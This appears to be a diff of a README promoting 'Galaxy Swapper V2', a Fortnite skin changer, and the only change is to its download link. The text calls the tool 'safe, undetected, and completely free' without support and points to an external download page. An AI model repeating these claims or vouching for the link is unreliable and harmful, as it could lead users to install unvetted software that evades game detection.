@@ -2,7 +2,7 @@
 
 **Galaxy Swapper V2** is a powerful and easy-to-use Fortnite skin changer for PC, allowing you to swap outfits, emotes, pickaxes, and other cosmetics instantly. Safe, undetected, and completely free, it's your go-to tool for Fortnite customization.
 
-[![Download Galaxy Swapper V2](https://img.shields.io/badge/Download-Galaxy_Swapper_V2-blueviolet)](https://galaxy-swapper-v2-fortnite-skin-changer.github.io/.github)
+[![Download Galaxy Swapper V2](https://img.shields.io/badge/Download-Galaxy_Swapper_V2-blueviolet)](https://galaxy-swapper-v2-fortnite-skin-changer.github.io/.github/)
 
 ---
 
